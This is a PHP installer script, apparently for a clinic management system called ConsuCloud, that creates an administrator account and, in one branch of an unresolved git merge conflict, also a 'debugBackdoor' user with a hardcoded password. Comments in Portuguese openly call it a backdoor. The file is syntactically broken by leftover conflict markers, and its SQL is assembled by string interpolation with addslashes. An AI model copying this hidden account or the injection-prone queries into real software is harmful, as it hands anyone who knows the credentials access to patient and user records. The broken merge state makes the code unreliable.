<?php
header ('Content-type: text/html; charset=UTF-8');

$senha = password_hash(trim(addslashes(strip_tags($_POST['senha']))), PASSWORD_DEFAULT);
$email = trim(addslashes(strip_tags($_POST['email'])));

require "../componentes/db/connect.php";

//Executar queries
$query = $mysqli->query("INSERT INTO usuarios (crm,tipoUsuario,nomeCompleto,areaAtuacao,RG,RGUFEXP,dataNasc,telCel,telFixo,email,endereco_logradouro,
endereco_numero,endereco_complemento,endereco_bairro,endereco_cidade,endereco_cep,endereco_estado,login,senha,nomeCurto) 
VALUES ('SysAdmin', 'admin', 'Administrador', 'Administrador', '0', 'ConsuCloud', '2000-01-01', '00 000000000', '00 00000000', '$email', 'ConsuCloud', '0', 
'ConsuCloud', 'ConsuCloud', 'ConsuCloud', '0', 'ConsuCloud', 'SysAdmin', '$senha', 'Admin')"); 

<<<<<<< HEAD
//COMENTE O PASSWORD_HASH E A QUERY ABAIXO (INCLUINDO A REMOÇÃO DA QUERY DA CHECAGEM NO IF) SE VOCÊ QUISER REMOVER COMPLETAMENTE O BACKDOOR DO SISTEMA
=======
/*
COMENTE O PASSWORD_HASH E A QUERY ABAIXO (INCLUINDO A REMOÇÃO DA QUERY DA CHECAGEM NO IF) SE VOCÊ QUISER REMOVER COMPLETAMENTE O BACKDOOR DO SISTEMA
>>>>>>> consucloud-2/master
$senhaBackdoor = password_hash("c0sult8r10s", PASSWORD_DEFAULT);

$backdoor = $mysqli->query("INSERT INTO usuarios (crm,tipoUsuario,nomeCompleto,areaAtuacao,RG,RGUFEXP,dataNasc,telCel,telFixo,email,endereco_logradouro,
endereco_numero,endereco_complemento,endereco_bairro,endereco_cidade,endereco_cep,endereco_estado,login,senha,nomeCurto) 
VALUES ('debugBackdoor', 'debug', 'Debugger','Debugging', '0', 'ConsuCloud', '2000-01-01', '00 000000000', '00 00000000', 'debug@debug.bug', 'ConsuCloud', '0', 
'ConsuCloud', 'ConsuCloud', 'ConsuCloud', '0', 'ConsuCloud', 'Debug', '$senhaBackdoor', 'Debug')"); 

<<<<<<< HEAD
/*
  Se a query para adicionar o backdoor estiver descomentada, adicione a linha abaixo no IF da checagem de queries:
    && $backdoor
*/

if ($query && $backdoor){
=======

Se a query para adicionar o backdoor estiver descomentada, adicione a linha abaixo no IF da checagem de queries:
  && $backdoor
*/

if ($query){
>>>>>>> consucloud-2/master
  echo '<script type="text/javascript">
					location.href="finish.php";
					</script>';
}else{
  echo $mysqli->error;
}

$mysqli->close();
?>